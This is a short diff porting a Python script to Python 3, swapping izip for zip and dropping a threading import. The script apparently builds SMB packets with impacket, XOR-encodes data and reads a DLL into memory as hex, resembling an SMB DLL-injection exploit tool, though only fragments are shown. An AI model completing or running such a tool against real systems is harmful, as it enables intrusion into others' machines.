@@ -3,10 +3,9 @@
 import binascii
 import socket
 import struct
-import threading
 
 #for XOR decryption
-from itertools import cycle, izip
+from itertools import cycle
 
 #https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
 class NewSMBPacket(Structure):
@@ -109,7 +108,7 @@ def disconnect_tree(self, tid):
 
 #same as XOR_Decrypt
 def xor_encrypt(message, key):
-	return ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(message, cycle(key)))
+	return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(message, cycle(key)))
 
 def read_dll_file_as_hex():
     print("reading DLL into memory!")
